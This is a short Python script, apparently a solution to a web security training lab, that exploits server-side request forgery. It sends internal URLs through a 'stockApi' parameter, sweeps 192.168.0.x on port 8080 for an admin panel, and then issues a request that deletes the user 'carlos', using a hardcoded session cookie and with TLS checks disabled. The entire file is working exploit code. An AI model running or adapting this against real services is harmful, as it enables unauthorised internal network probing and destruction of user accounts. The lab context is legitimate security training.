#!/usr/bin/python
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def req(url, numbers):

    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    cookies = {"session": "Lm5RCoKH5SoHcIYv7YNYhtlPweSkvK7F"} #por o seu cookie de sess√£o
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

    for num in numbers: 
        # r = requests.post(url, data={"stockApi": f"http://192.168.0.{num}:8080/admin"}, cookies=cookies, verify=False, proxies=proxies)
        r = requests.post(url, data={"stockApi": f"http://192.168.0.{num}:8080/admin"}, cookies=cookies, verify=False)

        
        if r.status_code != 500 and r.status_code != 400:
            print(f"{bcolors.OKGREEN}Status: {r.status_code}\tIP:192.168.0{num}{bcolors.ENDC}\n==========================")

        if r.status_code == 200:
            print(f"{bcolors.OKBLUE}URL to SSRF: http://192.168.0.{num}:8080/admin{bcolors.ENDC}")

            req = requests.post(url, data={"stockApi": f"http://192.168.0.{num}:8080/admin/delete?username=carlos"}, cookies=cookies, verify=False, proxies=proxies)
        
            print(req.status_code)
            if r.status_code == 200:
                print(f"\n{bcolors.FAIL}USER DELETED!{bcolors.ENDC}\n{bcolors.OKGREEN}url:http://192.168.0.{num}:8080/admin/delete?username=carlos{bcolors.ENDC}")
                break  
    
        
if __name__ == "__main__":
    if len(sys.argv) <= 1 :
        print(f"{bcolors.WARNING} USAGE: {sys.argv[0]} URL")
        exit(1)

    url = sys.argv[1]
    
    numbers = range(255)
    
    print(f"{bcolors.WARNING}[*] TESTANDO BLOCO DE IP{bcolors.ENDC}\n")
   
    req(url, numbers)
